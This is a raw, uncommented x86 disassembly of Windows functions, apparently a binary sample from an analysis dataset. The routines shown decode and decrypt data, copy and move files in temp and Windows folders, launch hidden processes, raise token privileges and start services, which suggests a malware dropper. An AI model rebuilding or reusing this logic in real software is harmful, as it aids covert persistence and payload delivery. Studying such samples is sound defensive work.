sub_401000
cmp [ esp + 0x4 ] 0x0
push esi
mov esi eax
jle r-xdata
mov al 0x1
pop esi
retn 0x4
mov al [ ecx ]
movzx eax al
mov al [ eax + r--data ]
inc ecx
test al al
jl r-xdata
mov dl [ ecx ]
movsx eax al
movzx edx dl
mov dl [ edx + r--data ]
shl eax 0x12
inc ecx
test dl dl
jl r-xdata
movsx edx dl
shl edx 0xc
or eax edx
mov edx eax
shr edx 0x10
mov [ esi ] dl
mov dl [ ecx ]
movzx edx dl
mov dl [ edx + r--data ]
inc esi
inc ecx
test dl dl
jl r-xdata
movsx edx dl
shl edx 0x6
or eax edx
mov edx eax
shr edx 0x8
mov [ esi ] dl
mov dl [ ecx ]
movzx edx dl
mov dl [ edx + r--data ]
inc esi
inc ecx
test dl dl
jl r-xdata
or al dl
mov [ esi ] al
inc esi
jmp r-xdata
sub_40109e
push ebp
mov ebp esp
sub esp 0x328
lea eax [ ebp - 0x324 ]
push esi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x224 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jle r-xdata
xor al al
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x224 ]
push eax
push [ ebp + 0x8 ]
call [ lstrcpynW@IAT ]
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ UuidCreate@IAT ]
test eax eax
jne r-xdata
pop esi
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ UuidToStringW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x224 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x226 ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x224 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x224 ]
push eax
call esi
sub_401143
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor al al
cmp [ eax ] 0x1
jbe r-xdata
cmp [ ebp + 0x10 ] 0x1
jbe r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_405c30
add esp 0x10
neg eax
sbb al al
inc al
jmp r-xdata
pop ebp
retn 0xc
sub_401177
xor ecx ecx
or eax 0xffffffff
cmp [ esp + 0x8 ] ecx
ja r-xdata
mov edx [ esp + 0x4 ]
movzx edx [ ecx + edx ]
xor edx eax
and edx 0xff
shr eax 0x8
xor eax [ edx * 4 + rw-data ]
inc ecx
cmp ecx [ esp + 0x8 ]
jb r-xdata
xor eax eax
jmp r-xdata
retn 0x8
sub_4011aa
push ebp
lea ebp [ esp - 0x70 ]
sub esp 0x104
cmp [ ebp + 0x7c ] 0x1
jg r-xdata
push ebx
push esi
xor ecx ecx
push edi
mov [ ebp + 0x6e ] cl
xor eax eax
mov edi 0x100
xor al al
jmp r-xdata
mov [ ebp + eax - 0x92 ] al
inc eax
cmp eax edi
jl r-xdata
mov [ ebp - 0x94 ] cl
mov [ ebp - 0x93 ] cl
xor esi esi
add ebp 0x70
leave
retn 0x8
mov [ ebp - 0x93 ] cl
mov dl [ eax ]
movzx ecx cl
lea ecx [ ebp + ecx - 0x92 ]
mov bl [ ecx ]
mov [ eax ] bl
mov [ ecx ] dl
movzx eax [ ebp - 0x94 ]
inc eax
and eax 0x8000001f
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
inc esi
cmp esi edi
mov [ ebp - 0x94 ] al
jl r-xdata
dec eax
or eax 0xffffffe0
inc eax
movzx ecx [ ebp - 0x94 ]
movzx ecx [ ecx + rw-data ]
lea eax [ ebp + esi - 0x92 ]
movzx edx [ eax ]
add ecx edx
movzx edx [ ebp - 0x93 ]
add ecx edx
and ecx 0x800000ff
jns r-xdata
xor edi edi
cmp [ ebp + 0x7c ] edi
mov [ ebp + 0x6e ] 0x1
jle r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
movzx esi [ ebp - 0x93 ]
movzx eax al
mov [ ebp - 0x94 ] al
movzx eax al
lea eax [ ebp + eax - 0x92 ]
movzx ecx [ eax ]
add ecx esi
and ecx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ ebp - 0x93 ] cl
mov dl [ eax ]
movzx ecx cl
lea ecx [ ebp + ecx - 0x92 ]
mov bl [ ecx ]
mov [ eax ] bl
mov [ ecx ] dl
movzx esi [ ebp - 0x93 ]
movzx eax [ ebp - 0x94 ]
movzx edx [ ebp + esi - 0x92 ]
movzx ebx [ ebp + eax - 0x92 ]
mov ecx [ ebp + 0x78 ]
add edx ebx
add ecx edi
and edx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx edx dl
mov dl [ ebp + edx - 0x92 ]
xor [ ecx ] dl
inc edi
cmp edi [ ebp + 0x7c ]
jl r-xdata
dec edx
or edx 0xffffff00
inc edx
inc eax
and eax 0x800000ff
jns r-xdata
sub_401346
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ eax ]
mov ebx ecx
lea edx [ ebx + 0xc ]
mov [ ebp - 0xc ] edi
call sub_40198f
test al al
je r-xdata
xor al al
cmp [ ebx + 0x8 ] edi
jae r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
jmp r-xdata
call sub_4019b5
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x2494 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4118 ] 0x0
jle r-xdata
mov [ ebp - 0x8 ] 0xfffff710
sub [ ebp - 0x8 ] esi
lea ebx [ esi + 0x8f0 ]
pop edi
pop ebx
leave
retn
cmp [ edi + 0x16 ] 0xff00aaee
jne r-xdata
mov [ ebp - 0x8 ] 0xffffda8c
sub [ ebp - 0x8 ] esi
lea ebx [ esi + 0x2574 ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add ebx 0xe4
cmp eax [ esi + 0x2494 ]
jl r-xdata
mov eax [ rw-data ]
cmp eax [ edi + 0x1e ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
push [ esi + 0x4a24 ]
call sub_40391f
mov eax [ edi + 0x26 ]
test eax eax
jl r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add ebx 0xe4
cmp eax [ esi + 0x4118 ]
jl r-xdata
mov eax [ rw-data ]
cmp eax [ edi + 0x1e ]
je r-xdata
mov eax [ edi + 0x16 ]
cmp eax [ ebx - 0xd8 ]
jne r-xdata
mov eax [ ebx ]
test eax eax
jle r-xdata
xor eax eax
call sub_4038dd
jmp r-xdata
mov eax [ edi + 0x16 ]
cmp eax [ ebx - 0xd8 ]
jne r-xdata
mov eax [ ebx ]
test eax eax
jle r-xdata
mov eax [ edi + 0x26 ]
test eax eax
jl r-xdata
cmp eax 0x10
jl r-xdata
mov ecx [ edi + 0x26 ]
push ecx
mov [ esi + 0x4a28 ] ecx
lea ecx [ edi + 0x32 ]
push ecx
push eax
call sub_40ab70
add esp 0xc
test eax eax
mov [ esi + 0x4a24 ] eax
je r-xdata
mov eax [ edi + 0x26 ]
test eax eax
jl r-xdata
cmp eax 0x10
jl r-xdata
xor eax eax
call sub_4038dd
jmp r-xdata
and [ ebx ] 0x0
xor eax eax
call sub_4038dd
jmp r-xdata
and [ ebx ] 0x0
mov edx [ edi + 0x26 ]
imul eax eax 0xd
add eax ecx
mov [ eax + esi + 0x824 ] edx
mov eax [ ebx ]
mov edx [ edi + 0x1e ]
imul eax eax 0xd
add eax ecx
mov [ eax + esi + 0x828 ] edx
mov eax [ edi + 0x1e ]
push [ edi + 0x26 ]
mov [ rw-data ] eax
lea eax [ edi + 0x32 ]
push eax
mov eax [ ebx ]
add eax 0xa0
imul eax eax 0xd
add eax ecx
push [ eax + esi ]
call sub_40ab70
add esp 0xc
inc [ ebx ]
mov edx [ ebx ]
mov ecx [ ebp - 0x8 ]
add edx 0xa0
imul edx edx 0xd
add ecx ebx
add edx ecx
mov [ edx + esi ] eax
mov eax [ ebx ]
lea edx [ eax + 0xa0 ]
imul edx edx 0xd
add edx ecx
cmp [ edx + esi ] 0x0
je r-xdata
mov edx [ edi + 0x26 ]
mov [ eax + 0x24a8 ] edx
mov eax [ ebx ]
mov edx [ edi + 0x1e ]
imul eax eax 0xd
add eax ecx
mov [ eax + esi + 0x24ac ] edx
mov eax [ edi + 0x1e ]
push [ edi + 0x26 ]
mov [ rw-data ] eax
lea eax [ edi + 0x32 ]
push eax
mov eax [ ebx ]
imul eax eax 0xd
add eax ecx
push [ eax + esi + 0x24a4 ]
call sub_40ab70
add esp 0xc
inc [ ebx ]
mov edx [ ebx ]
mov ecx [ ebp - 0x8 ]
imul edx edx 0xd
add ecx ebx
add edx ecx
mov [ edx + esi + 0x24a4 ] eax
mov eax [ ebx ]
imul eax eax 0xd
add eax ecx
add eax esi
cmp [ eax + 0x24a4 ] 0x0
je r-xdata
sub_40159b
mov eax sub_415b7d
call sub_411740
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_401b2c
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
imul ecx ecx 0x14
lea edx [ esi + 0xc ]
push edx
push [ esi + 0x8 ]
push eax
call [ ecx + eax + 0x284 ]
add esp 0xc
mov [ esi + 0x10 ] al
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4015fd
mov eax sub_415bda
call sub_411740
sub esp 0x38
push ebx
push esi
push edi
lea esi [ ebp - 0x30 ]
mov edi ecx
call sub_401311
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
mov eax [ ebp + 0x14 ]
mov [ eax ] ebx
lea eax [ edi + 0x49cc ]
cmp eax ebx
mov [ ebp - 0x14 ] eax
je r-xdata
xor al al
push eax
call sub_403975
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x30 ] ebx
je r-xdata
call sub_402298
sub eax [ edi + 0x4a20 ]
cmp eax 0x1
mov [ ebp - 0x20 ] eax
jb r-xdata
test al al
je r-xdata
xor al al
call sub_402a24
push [ ebp - 0x30 ]
call sub_40391f
xor eax eax
cmp [ edi + 0x2494 ] ebx
mov esi 0xe4
jle r-xdata
call sub_402298
push 0x1
push __dos_header
lea esi [ ebp - 0x30 ]
mov [ edi + 0x4a20 ] eax
call sub_4039b5
cmp [ edi + 0x504 ] ebx
mov esi [ ebp - 0x2c ]
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x18 ] ebx
jle r-xdata
xor ecx ecx
cmp [ edi + 0x4118 ] ebx
jle r-xdata
lea ecx [ edi + 0x8f0 ]
inc [ edi + 0x4b60 ]
jmp r-xdata
lea ebx [ edi + 0x294 ]
cmp [ ebp + 0x8 ] 0xff00aaee
jne r-xdata
lea eax [ edi + 0x2574 ]
inc eax
add ecx esi
cmp eax [ edi + 0x2494 ]
jl r-xdata
mov edx [ ecx ]
cmp edx ebx
jle r-xdata
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x20 ]
push eax
push ecx
lea eax [ ebp - 0x44 ]
push eax
push sub_40159b
push 0x10000
push ecx
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] cl
call [ CreateThread@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ edi + 0x4a24 ]
mov ecx [ eax ]
cmp ecx ebx
je r-xdata
inc ecx
add eax esi
cmp ecx [ edi + 0x4118 ]
jl r-xdata
mov edx [ eax ]
cmp edx ebx
jle r-xdata
mov edx [ ebp + 0x8 ]
cmp edx [ ecx - 0xd8 ]
jne r-xdata
cmp edx 0x10
jl r-xdata
cmp [ ebp - 0x34 ] 0x0
mov esi [ ebp - 0x38 ]
mov [ ebp - 0x1c ] esi
jne r-xdata
push [ ebx - 0x4 ]
push esi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
push [ ebp - 0x14 ]
call sub_403995
mov edx [ ebp + 0x10 ]
add edi 0x4a28
cmp [ ebp - 0x14 ] ebx
mov [ edx ] ecx
mov ecx [ edi ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ecx
mov [ eax ] ebx
mov [ edi ] ebx
je r-xdata
mov edx [ ebp + 0x8 ]
cmp edx [ eax - 0xd8 ]
jne r-xdata
cmp edx 0x10
jl r-xdata
mov edx [ ebp + 0x10 ]
mov ebx eax
imul ebx ebx 0xe4
lea esi [ ebx + edi ]
dec [ esi + 0x8f0 ]
lea ecx [ esi + 0x820 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ esi + 0x824 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax [ esi + 0x828 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ esi + 0x8f0 ]
imul eax eax 0xd
push eax
lea eax [ esi + 0x82d ]
push eax
push ecx
call sub_40ab70
mov ecx [ esi + 0x8f0 ]
add ecx 0xa0
imul ecx ecx 0xd
add ecx ebx
xor eax eax
mov [ ecx + edi ] eax
mov ecx [ esi + 0x8f0 ]
imul ecx ecx 0xd
add ecx ebx
mov [ ecx + edi + 0x824 ] eax
mov ecx [ esi + 0x8f0 ]
imul ecx ecx 0xd
add ecx ebx
mov [ ecx + edi + 0x828 ] eax
mov [ esi + 0x82c ] 0x1
test esi esi
jle r-xdata
inc [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
add ebx 0x14
cmp eax [ edi + 0x504 ]
jl r-xdata
inc [ ebx ]
push 0x0
push esi
call [ TerminateThread@IAT ]
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x30 ] ebx
jmp r-xdata
push [ ebp - 0x14 ]
call sub_403995
mov edx [ ebp + 0x10 ]
mov ebx ecx
imul ebx ebx 0xe4
lea esi [ ebx + edi ]
dec [ esi + 0x2574 ]
lea ecx [ esi + 0x24a4 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ esi + 0x24a8 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax [ esi + 0x24ac ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ esi + 0x2574 ]
imul eax eax 0xd
push eax
lea eax [ esi + 0x24b1 ]
push eax
push ecx
call sub_40ab70
mov ecx [ esi + 0x2574 ]
imul ecx ecx 0xd
add ecx ebx
xor eax eax
mov [ ecx + edi + 0x24a4 ] eax
mov ecx [ esi + 0x2574 ]
imul ecx ecx 0xd
add ecx ebx
mov [ ecx + edi + 0x24a8 ] eax
mov ecx [ esi + 0x2574 ]
imul ecx ecx 0xd
add ecx ebx
mov [ ecx + edi + 0x24ac ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x30 ] eax
push [ ebp - 0x14 ]
call sub_403995
xor eax eax
and [ edi + 0x4b60 ] 0x0
xor ebx ebx
call sub_402298
cmp [ ebp - 0x30 ] 0x0
mov [ edi + 0x4a20 ] eax
je r-xdata
push 0x11
pop ecx
lea eax [ ebp - 0x44 ]
xor ebx ebx
push esi
call [ CloseHandle@IAT ]
je r-xdata
add esp 0xc
cmp [ ebp - 0x14 ] eax
je r-xdata
mov al 0x1
jmp r-xdata
call sub_402a24
push [ ebp - 0x30 ]
call sub_40391f
mov ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x1c ]
mov esi edi
call sub_401346
push esi
push [ ebp - 0x30 ]
call sub_4011aa
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_40198f
push ebx
push esi
xor esi esi
mov al 0x1
sub edx rw-data
xor al al
inc esi
cmp esi 0x10
jl r-xdata
lea ecx [ esi + rw-data ]
mov bl [ edx + ecx ]
cmp bl [ ecx ]
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
sub_4019b5
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push ebx
sub eax 0x10
push esi
xor ebx ebx
test eax eax
push edi
jle r-xdata
xor eax eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
inc ebx
sub eax 0x10
inc edi
cmp ebx eax
jl r-xdata
mov edx edi
call sub_40198f
test al al
je r-xdata
mov al [ edi ]
cmp al [ rw-data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ edi + 0x36 ]
add ebx 0x10
add edi 0x10
lea eax [ ebx + eax + 0x4 ]
mov [ ebp - 0x4 ] eax
add esi 0x2e
call sub_402a24
xor eax eax
cmp [ ebp - 0x4 ] eax
je r-xdata
mov edx [ edi + 0x26 ]
mov ecx [ ebp + 0xc ]
cmp edx [ ecx ]
jae r-xdata
push esi
push [ ebp - 0x4 ]
call sub_401177
cmp eax [ edi ]
je r-xdata
add esi ebx
sub [ ecx ] esi
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401a38
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x4 ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push r--data
push 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x8 ] 0x2
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
xor al al
leave
retn
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov al 0x1
leave
retn
push 0x0
push 0x0
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push [ ebp - 0x4 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
sub_401abf
push esi
push edi
mov edi eax
push 0x40
add edi 0x4
pop ecx
mov eax edi
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push [ esp + 0xc ]
mov esi [ lstrlenW@IAT ]
call esi
cmp eax 0x1f
jbe r-xdata
push [ esp + 0xc ]
call esi
push 0x1f
pop eax
jmp r-xdata
add eax eax
push eax
push [ esp + 0x10 ]
push edi
call sub_40b1d0
add esp 0xc
pop edi
pop esi
retn 0x4
sub_401b03
mov eax ecx
xor edx edx
push esi
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov esi 0xd0
lea ecx [ eax + 0xc ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
mov [ eax + 0xdc ] edx
mov [ eax + 0xe0 ] edx
pop esi
retn
sub_401b38
push ebp
mov ebp esp
sub esp 0x38
cmp [ ebp + 0x8 ] 0xc0000005
push edi
je r-xdata
lea eax [ ebp - 0x35 ]
push eax
mov eax [ ebp + 0xc ]
mov edi [ eax ]
call sub_401d02
push r--data
lea eax [ ebp - 0x35 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
call sub_401c8e
push r--data
lea eax [ ebp - 0x18 ]
push eax
call sub_41175f
sub_401bc2
mov eax sub_415b73
call sub_411740
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_401c09
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov al [ edi + 0x18 ]
mov [ esi + 0x18 ] al
mov eax [ edi + 0x19 ]
mov [ esi + 0x19 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401c09
mov eax sub_415b4f
call sub_411740
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_40b5f8
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401c8e
mov eax sub_415b3d
call sub_411740
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov ecx esi
call sub_40b599
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0xc ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0x10 ] eax
mov eax [ edi ]
mov [ esi + 0x14 ] eax
mov edi [ edi ]
cmp edi 0xc0000005
je r-xdata
mov [ esi + 0xc ] r--data
cmp edi 0xc000008e
je r-xdata
mov [ esi + 0xc ] r--data
jmp r-xdata
cmp edi 0xc0000094
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401d02
mov eax sub_415b61
call sub_411740
push esi
mov esi [ ebp + 0x8 ]
push esi
mov ecx edi
call sub_401c8e
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x18 ] al
mov [ esi + 0x19 ] eax
mov [ esi ] r--data
cmp [ edi + 0x14 ] 0x1
sete al
mov [ esi + 0x18 ] al
mov eax [ edi + 0x18 ]
mov [ esi + 0x19 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_401d53
push ebx
push esi
push edi
push 0x1f
mov edi rw-data
pop ebx
mov esi 0xe4
mov ecx edi
call sub_401b03
add edi esi
dec ebx
jns r-xdata
push 0x1f
mov edi rw-data
pop ebx
mov ecx edi
call sub_401b03
add edi esi
dec ebx
jns r-xdata
mov ebx rw-data
push 0x1f
mov esi ebx
pop edi
mov ecx esi
call sub_401aac
add esi 0x44
dec edi
jns r-xdata
call sub_401b2c
xor eax eax
push 0x64
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop edx
mov ecx rw-data
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
or esi 0xffffffff
push 0x8
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop edx
mov ecx rw-data
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
mov edx 0x120
mov ecx rw-data
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
mov edx 0x880
mov ecx ebx
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
call [ FreeConsole@IAT ]
push 0x8007
call [ SetErrorMode@IAT ]
push sub_401d4e
call [ SetUnhandledExceptionFilter@IAT ]
call sub_401b2c
push rw-data
call sub_403955
push rw-data
call sub_403955
push rw-data
call sub_403955
push rw-data
mov [ rw-data ] esi
call sub_403955
push r--data
push r--data
mov edi rw-data
call sub_401f61
mov [ rw-data ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_401e94
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push 0x44
pop ecx
mov edx ecx
lea eax [ ebp - 0x58 ]
xor ebx ebx
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
push 0x10
pop edx
lea eax [ ebp - 0x10 ]
mov [ eax ] bl
inc eax
dec edx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push ebx
push ebx
push 0x8000000
push ebx
push ebx
push ebx
push [ ebp + 0xc ]
mov [ ebp - 0x58 ] ecx
push [ ebp + 0x8 ]
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x28 ] bx
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
xor al al
cmp esi ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ esi ] eax
pop ebx
leave
retn 0x8
sub_401efb
push ebx
push ebp
push 0xf003f
xor ebx ebx
push ebx
push ebx
call [ OpenSCManagerW@IAT ]
mov ebp eax
cmp ebp ebx
jne r-xdata
push esi
push edi
push 0xf01ff
push [ esp + 0x18 ]
push ebp
call [ OpenServiceW@IAT ]
mov edi [ CloseServiceHandle@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
xor al al
push ebx
push ebx
push esi
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
push ebp
call edi
pop edi
mov al bl
pop esi
jmp r-xdata
mov bl 0x1
call [ GetLastError@IAT ]
cmp eax 0x420
jne r-xdata
pop ebp
pop ebx
retn 0x4
push esi
call edi
jmp r-xdata
sub_401f61
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ebx [ lstrcmpiW@IAT ]
mov esi r--data
push esi
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
push esi
call [ GetModuleHandleW@IAT ]
mov esi eax
jmp r-xdata
push r--data
push [ ebp + 0x8 ]
call ebx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push esi
call [ GetProcAddress@IAT ]
jmp r-xdata
lea eax [ edi + 0x4120 ]
xor esi esi
mov [ ebp - 0x4 ] eax
pop esi
pop ebx
leave
retn 0x8
imul esi esi 0x44
mov esi [ esi + edi + 0x411c ]
test esi esi
jne r-xdata
add [ ebp - 0x4 ] 0x44
inc esi
cmp esi 0x20
jl r-xdata
push [ ebp + 0x8 ]
call [ LoadLibraryW@IAT ]
mov esi eax
xor eax eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call ebx
test eax eax
je r-xdata
jmp r-xdata
lea ecx [ edi + 0x411c ]
push [ ebp + 0x8 ]
imul eax eax 0x44
lea eax [ eax + edi + 0x411c ]
mov [ eax ] esi
call sub_401abf
inc eax
add ecx 0x44
cmp eax 0x20
jl r-xdata
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
sub_402029
push ebp
mov ebp esp
sub esp 0x21c
push ebx
push esi
push edi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
xor ebx ebx
push eax
push 0xff00aaee
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x1 ] bl
call sub_4015fd
test al al
je r-xdata
mov al [ ebp - 0x1 ]
cmp [ ebp - 0x8 ] ebx
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x218 ]
push eax
call sub_40234d
mov esi r--data
push esi
lea eax [ ebp - 0x218 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x218 ]
push eax
call sub_402f8f
mov edi eax
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
call sub_40391f
mov ecx [ ebp - 0xc ]
push 0x1
push [ ebp - 0x8 ]
push edi
call sub_40303c
test al al
je r-xdata
call sub_40107d
push eax
lea eax [ ebp - 0x218 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x218 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x218 ]
push eax
call sub_40107d
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
push 0x1
push esi
mov eax edi
xor ecx ecx
call sub_4031bc
mov ebx eax
test ebx ebx
je r-xdata
push edi
call sub_40391f
push 0x0
call sub_40107d
push eax
push edi
call [ CopyFileW@IAT ]
lea eax [ ebp - 0x218 ]
test eax eax
je r-xdata
push 0x0
push ebx
xor esi esi
call sub_401e94
test al al
je r-xdata
push 0x410
push eax
push rw-data
call [ lstrcpynW@IAT ]
push ebx
call sub_40391f
mov [ ebp - 0x1 ] 0x1
sub_402161
push ebp
mov ebp esp
sub esp 0x624
push ebx
push esi
push edi
push 0x1
push 0x208
lea eax [ ebp - 0x210 ]
push eax
call sub_40109e
test al al
je r-xdata
xor al al
mov edi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call edi
lea eax [ ebp - 0x210 ]
test eax eax
jne r-xdata
push 0x1
lea eax [ ebp - 0x210 ]
push eax
call sub_402ae7
mov esi eax
xor esi esi
jmp r-xdata
xor ecx ecx
mov eax rw-data
cmp ecx eax
je r-xdata
test esi esi
mov [ ebp - 0x4 ] esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov esi 0x104
push esi
lea eax [ ebp - 0x620 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
test eax eax
mov ebx [ lstrcpyW@IAT ]
je r-xdata
push 0x204
push eax
push esi
call sub_402b5d
push r--data
lea eax [ ebp - 0x620 ]
push eax
call ebx
cmp eax esi
jae r-xdata
push 0x1388
call [ Sleep@IAT ]
push 0x0
push [ ebp - 0x4 ]
call [ TerminateProcess@IAT ]
